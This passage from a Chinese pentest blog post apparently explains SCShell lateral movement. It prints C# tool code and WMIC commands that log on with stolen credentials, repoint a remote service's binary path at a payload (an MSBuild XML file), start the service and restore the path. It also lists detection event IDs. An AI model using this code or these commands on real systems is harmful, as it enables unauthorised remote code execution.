+<p>最后再次使用 <code>ChangeServiceConfigA</code> 还原服务的配置。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(dwLpqscSize) &#123;</span><br><span class="line">  bResult = FALSE;</span><br><span class="line">  bResult = ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, originalBinaryPath, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">if</span>(!bResult) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"ChangeServiceConfigA failed to revert the service path. %ld\n"</span>, GetLastError());</span><br><span class="line">    ExitProcess(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Service path was restored to \"%s\"\n"</span>, originalBinaryPath);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>整个过程还是比较简单的。</p>
+<h2 id="0x03-C-实现"><a href="#0x03-C-实现" class="headerlink" title="0x03 C# 实现"></a>0x03 C# 实现</h2><p>能在 MSDN 中找到的函数，在 <code>pinvoke.net</code> 中基本能找到对相应的例子，所以直接引用即可。</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="keyword">string</span>[] args</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Console.WriteLine();</span><br><span class="line">	Console.WriteLine(<span class="string">"=============== SharpSCShell --&gt; Revised at Rcoil (C# version) =============== "</span>);</span><br><span class="line">	Console.WriteLine();</span><br><span class="line">	<span class="keyword">if</span> (args.Length &lt; <span class="number">2</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		Console.WriteLine(<span class="string">"SharpSCShell.exe target service payload domain username password"</span>);</span><br><span class="line">		Environment.Exit(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">  </span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">	Console.WriteLine(<span class="string">"[*] Trying to connect to &#123;0&#125;"</span>, target);</span><br><span class="line">	<span class="keyword">bool</span> bResult = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">if</span> (username != <span class="literal">null</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		Console.WriteLine(<span class="string">"[*] Username was provided attempting to call LogonUser"</span>);</span><br><span class="line">		bResult = LogonUser(username, domain, password, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, <span class="keyword">ref</span> phToken);</span><br><span class="line">		<span class="keyword">if</span> (!bResult)</span><br><span class="line">		&#123;</span><br><span class="line">			Console.WriteLine(<span class="string">"[!] LogonUser failed. Error:&#123;0&#125;"</span>, GetLastError());</span><br><span class="line">			Environment.Exit(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	bResult = ImpersonateLoggedOnUser(phToken);</span><br><span class="line">	<span class="keyword">if</span> (!bResult)</span><br><span class="line">	&#123;</span><br><span class="line">		Console.WriteLine(<span class="string">"[!] ImpersonateLoggedOnUser failed. Error:&#123;0&#125;"</span>, GetLastError());</span><br><span class="line">		Environment.Exit(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	IntPtr SCMHandle = OpenSCManager(target, <span class="literal">null</span>, (<span class="keyword">uint</span>)SCM_ACCESS.SC_MANAGER_ALL_ACCESS);</span><br><span class="line">	<span class="keyword">if</span> (SCMHandle == IntPtr.Zero)</span><br><span class="line">	&#123;</span><br><span class="line">		Console.WriteLine(<span class="string">"[!] OpenSCManagerA failed! Error:&#123;0&#125;"</span>, GetLastError());</span><br><span class="line">		Environment.Exit(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	Console.WriteLine(<span class="string">"[*] SC_HANDLE Manager 0x&#123;0&#125;"</span>, SCMHandle);</span><br><span class="line"></span><br><span class="line">	Console.WriteLine(<span class="string">"[*] Opening &#123;0&#125; Service ...."</span>, ServiceName);</span><br><span class="line">	IntPtr schService = OpenService(SCMHandle, ServiceName, ((<span class="keyword">uint</span>)SERVICE_ACCESS.SERVICE_ALL_ACCESS));</span><br><span class="line">	Console.WriteLine(<span class="string">"[*] SC_HANDLE Service 0x&#123;0&#125;"</span>, schService);</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	QueryServiceConfigStruct qscs = <span class="keyword">new</span> QueryServiceConfigStruct();</span><br><span class="line">	IntPtr qscPtr = Marshal.AllocCoTaskMem(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">int</span> retCode = QueryServiceConfig(schService, qscPtr, <span class="number">0</span>, <span class="keyword">ref</span> bytesNeeded);</span><br><span class="line">	<span class="keyword">if</span> (retCode == <span class="number">0</span> &amp;&amp; bytesNeeded == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		Console.WriteLine(<span class="string">"[!] QueryServiceConfig failed to read the service path. Error:&#123;0&#125;"</span>, GetLastError());</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		Console.WriteLine(<span class="string">"[*] LPQUERY_SERVICE_CONFIGA need &#123;0&#125; bytes"</span>, bytesNeeded);</span><br><span class="line">		qscPtr = Marshal.AllocCoTaskMem(bytesNeeded);</span><br><span class="line">		retCode = QueryServiceConfig(schService, qscPtr, bytesNeeded, <span class="keyword">ref</span> bytesNeeded);</span><br><span class="line">		qscs.binaryPathName = IntPtr.Zero;</span><br><span class="line"></span><br><span class="line">		qscs = (QueryServiceConfigStruct)Marshal.PtrToStructure(qscPtr, <span class="keyword">new</span> QueryServiceConfigStruct().GetType());</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">string</span> originalBinaryPath = Marshal.PtrToStringAuto(qscs.binaryPathName);</span><br><span class="line">	Console.WriteLine(<span class="string">"[*] Original service binary path \"&#123;0&#125;\""</span>, originalBinaryPath);</span><br><span class="line">	Marshal.FreeCoTaskMem(qscPtr);</span><br><span class="line"></span><br><span class="line">	bResult = ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, payload, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">	<span class="keyword">if</span> (!bResult)</span><br><span class="line">	&#123;</span><br><span class="line">		Console.WriteLine(<span class="string">"[!] ChangeServiceConfigA failed to update the service path. Error:&#123;0&#125;"</span>, GetLastError());</span><br><span class="line">		Environment.Exit(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	Console.WriteLine(<span class="string">"[*] Service path was changed to \"&#123;0&#125;\""</span>, payload);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	bResult = StartService(schService, <span class="number">0</span>, <span class="literal">null</span>);</span><br><span class="line">	<span class="keyword">uint</span> dwResult = GetLastError();</span><br><span class="line">	<span class="keyword">if</span> (!bResult &amp;&amp; dwResult != <span class="number">1053</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		Console.WriteLine(<span class="string">"[!] StartServiceA failed to start the service. Error:&#123;0&#125;"</span>, GetLastError());</span><br><span class="line">		Environment.Exit(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		Console.WriteLine(<span class="string">"[*] Service was started"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	bResult = ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, originalBinaryPath, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">	<span class="keyword">if</span> (!bResult)</span><br><span class="line">	&#123;</span><br><span class="line">		Console.WriteLine(<span class="string">"[!] ChangeServiceConfigA failed to revert the service path. Error:&#123;0&#125;"</span>, GetLastError());</span><br><span class="line">		Environment.Exit(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		Console.WriteLine(<span class="string">"[*] Service path was restored to \"&#123;0&#125;\""</span>, originalBinaryPath);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong><em>运行结果：</em></strong></p>
+<p><img src="/image/【渗透技巧】SCshell 技术细节/blog_2019-12-11_23-14-22.png" alt=""></p>
+<p><strong><em>运行流量：</em></strong></p>
+<p><img src="/image/【渗透技巧】SCshell 技术细节/blog_2019-12-11_21-18-55.png" alt=""></p>
+<p>可以较为明显的看到是 <code>DCE/RPC</code> 协议进行的，且整个过程的 API 调用看得清清楚楚。</p>
+<p>项目源码已发布至 Github，请注意查收：<a href="https://github.com/RcoIl/CSharp-Tools/tree/master/SharpSCShell" target="_blank" rel="noopener">SharpSCShell</a>，并将此源码合并至作者的 <a href="https://github.com/Mr-Un1k0d3r/SCShell" target="_blank" rel="noopener">SCShell</a></p>
+<h2 id="0x04-日志"><a href="#0x04-日志" class="headerlink" title="0x04 日志"></a>0x04 日志</h2><p>使用用户凭证连接目标时，会留下正常的登陆日志，4624。同时如果服务超时，也会产生 7009 日志。当然，如果直接使用 ELK 监视事件 ID 4657，也是有惊喜的，而且很明显。</p>
+<p><img src="/image/【渗透技巧】SCshell 技术细节/blog_2019-12-11_20-59-37.png" alt=""></p>
+<p><img src="/image/【渗透技巧】SCshell 技术细节/blog_2019-12-11_21-00-30.png" alt=""></p>
+<p>该工具经过测试，当防火墙打开时无法连接，且大部分命令无法执行，原因有待探究。</p>
+<h2 id="0x05-WMIC"><a href="#0x05-WMIC" class="headerlink" title="0x05 WMIC"></a>0x05 WMIC</h2><p><code>WMIC</code>  与 <code>SCShell</code> 有类似的功能。</p>
+<p><strong><em>步骤1：</em></strong> 获取目标服务的当前 <code>pathName</code>，以便我们在运行命令后就可以将其还原（在本例中为 <code>XblAuthManager</code>）</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /user:DOMAIN\USERNAME /password:PASSWORD /node:TARGET_IP service where name=<span class="string">'XblAuthManager'</span> get pathName</span><br></pre></td></tr></table></figure>
+<p><strong><em>步骤2：</em></strong>将 <code>pathName</code> 更改为要运行的任何命令</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /user:DOMAIN\USERNAME /password:PASSWORD /node:TARGET_IP service where name=<span class="string">'XblAuthManager'</span> call change PathName=<span class="string">"C:\Windows\Microsoft.Net\Framework\v4.0.30319\MSBuild.exe C:\testPayload.xml"</span></span><br></pre></td></tr></table></figure>
+<p><strong><em>步骤3：</em></strong>启动修改后的服务</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /user:DOMAIN\USERNAME /password:PASSWORD /node:TARGET_IP service where name=<span class="string">'XblAuthManager'</span> call startservice</span><br></pre></td></tr></table></figure>
+<p><strong><em>步骤4：</em></strong>将服务 <code>pathName</code> 更改回其原始值</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /user:DOMAIN\USERNAME /password:PASSWORD /node:TARGET_IP service where name=<span class="string">'XblAuthManager'</span> call change PathName=<span class="string">"C:\Windows\system32\svchost.exe -k netsvcs"</span></span><br></pre></td></tr></table></figure>
+<p>这一部分本来打算另起一文，在写 WMI 放入，但想想之后的文章还是留在知识星球进行自我沉淀。</p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+  <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+	
+        <div id="alipay" style="display: inline-block">
+          <img id="alipay_qr" src="/images/知识星球.jpeg" alt="RcoIl Alipay">
+        </div>
+    
+  
+    <div>！坚持技术分享，您的支持将鼓励我继续创作！</div>
+    <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+      <span>赏</span>
+    </button>
+    <div id="QR" style="display: none;">
+      
+        <div id="wechat" style="display: inline-block">
+          <img id="wechat_qr" src="/images/wechatpay.jpg" alt="RcoIl WeChat Pay">
+          <p>微信打赏</p>
+        </div>
+      
+      
+        <div id="alipay" style="display: inline-block">
+          <img id="alipay_qr" src="/images/知识星球.jpeg" alt="RcoIl Alipay">
+          <p>知识星球</p>
+        </div>
+      
+    </div>
+  </div>
+
+
+      
+    </div>
+
+    <div>
+      
+        
+  <ul class="post-copyright">
+    <li class="post-copyright-author">
+      <strong>嘤嘤怪：</strong>
+      RcoIl
+    </li>
+    <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://rcoil.me/2019/12/【渗透技巧】SCshell 技术细节/" title="【渗透技巧】SCshell 技术细节">https://rcoil.me/2019/12/【渗透技巧】SCshell 技术细节/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong>
+      本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/内网渗透/" rel="tag"><i class="fa fa-tag" aria-hidden="true"></i> 内网渗透</a>
+          
+            <a href="/tags/SCShell/" rel="tag"><i class="fa fa-tag" aria-hidden="true"></i> SCShell</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/11/【知识回顾】命名管道/" rel="next" title="【知识回顾】命名管道">
+                <i class="fa fa-chevron-left"></i> 【知识回顾】命名管道
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8yODE5NS80NzY4"></div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image" src="/images/avatar.png" alt="RcoIl">
+          <p class="site-author-name" itemprop="name">RcoIl</p>
+           
+              <p class="site-description motion-element" itemprop="description">好吃懒做，还有就是皮肤比黄皮果还黄！</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">41</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">5</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">19</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/RcoIl" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=rcoil@qq.com" target="_blank" title="Email">
+                  
+                    <i class="fa fa-fw fa-fa fa-envelope-open"></i>
+                  
+                  Email
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://t.zsxq.com/i2zJI2V" target="_blank" title="知识星球">
+                  
+                    <i class="fa fa-fw fa-fa fa-battery-bolt"></i>
+                  
+                  知识星球
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+		
+		
+          <div class="feed-link motion-element">
+            <div id="days"></div>
+			<script language="javascript">
+			function show_date_time(){
+				window.setTimeout("show_date_time()", 1000);
+				BirthDay=new Date("09/01/2016 10:13:14");
+				today=new Date();
+				timeold=(today.getTime()-BirthDay.getTime());
+				sectimeold=timeold/1000
+				secondsold=Math.floor(sectimeold);
+				msPerDay=24*60*60*1000
+				e_daysold=timeold/msPerDay
+				daysold=Math.floor(e_daysold);
+				e_hrsold=(e_daysold-daysold)*24;
+				hrsold=setzero(Math.floor(e_hrsold));
+				e_minsold=(e_hrsold-hrsold)*60;
+				minsold=setzero(Math.floor((e_hrsold-hrsold)*60));
+				seconds=setzero(Math.floor((e_minsold-minsold)*60));
+				document.getElementById('days').innerHTML="本站已运行 "+daysold+" 天 "+hrsold+" 小时 "+minsold+" 分"+ seconds +" 秒";
+			}
+			function setzero(i){
+				if (i<10)
+				{i="0" + i};
+				return i;
+			}		
+			show_date_time();
+		</script>
+        </div>
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://isron.cn/" title="Isron" target="_blank">Isron</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://hacktech.cn/" title="Akkuman" target="_blank">Akkuman</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://rootrain.me/" title="rootrain" target="_blank">rootrain</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://kerlinglovsec.lofter.com/" title="kerling" target="_blank">kerling</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://www.luolikong.vip/" title="Fire-ant" target="_blank">Fire-ant</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://xnianq.cn/" title="xniang" target="_blank">xniang</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://thief.one/" title="nMask" target="_blank">nMask</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://cate4cafe.com/" title="cate4cafe" target="_blank">cate4cafe</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://52stu.me/" title="IversOn5" target="_blank">IversOn5</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://hone.cool/" title="Hone" target="_blank">Hone</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://sharecast.bitcron.com/" title="sharecast" target="_blank">sharecast</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://scarletf.github.io/" title="ScarletF" target="_blank">ScarletF</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://www.lz1y.cn/" title="Lz1y" target="_blank">Lz1y</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://k8gege.org/" title="K8gege" target="_blank">K8gege</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-前言"><span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-函数-API-介绍"><span class="nav-text">0x01 函数 API 介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1、LogonUserA"><span class="nav-text">1.1、LogonUserA</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2、ImpersonateLoggedOnUserA"><span class="nav-text">1.2、ImpersonateLoggedOnUserA</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3、OpenSCManagerA"><span class="nav-text">1.3、OpenSCManagerA</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-4、OpenServiceA"><span class="nav-text">1.4、OpenServiceA</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-5、QueryServiceConfigA"><span class="nav-text">1.5、QueryServiceConfigA</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-6、ChangeServiceConfigA"><span class="nav-text">1.6、ChangeServiceConfigA</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-7、StartServiceA"><span class="nav-text">1.7、StartServiceA</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-技术细节"><span class="nav-text">0x02 技术细节</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1、时序图"><span class="nav-text">2.1、时序图</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2、登陆"><span class="nav-text">2.2、登陆</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3、Service-Manager"><span class="nav-text">2.3、Service Manager</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-C-实现"><span class="nav-text">0x03 C# 实现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-日志"><span class="nav-text">0x04 日志</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-WMIC"><span class="nav-text">0x05 WMIC</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">
+  
+  &copy;  2016 - 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+<!--
+    <i class="fa fa-heart"></i>
+-->
+	<i class="fa fa-address-card-o" aria-hidden="true"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">RcoIl</span>
+</div>
+<!--
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+-->
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-blind" aria-hidden="true"></i>本站访客数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      人
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-user-md" aria-hidden="true"></i>本站总访问量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length == 0) {
+      search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.popup').toggle();
+    }
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+      $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = $( "entry", xmlResponse ).map(function() {
+            return {
+              title: $( "title", this ).text(),
+              content: $("content",this).text(),
+              url: $( "url" , this).text()
+            };
+          }).get();
+          var $input = document.getElementById(search_id);
+          var $resultContent = document.getElementById(content_id);
+          $input.addEventListener('input', function(){
+            var matchcounts = 0;
+            var str='<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length > 1) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var content_index = [];
+                var data_title = data.title.trim().toLowerCase();
+                var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
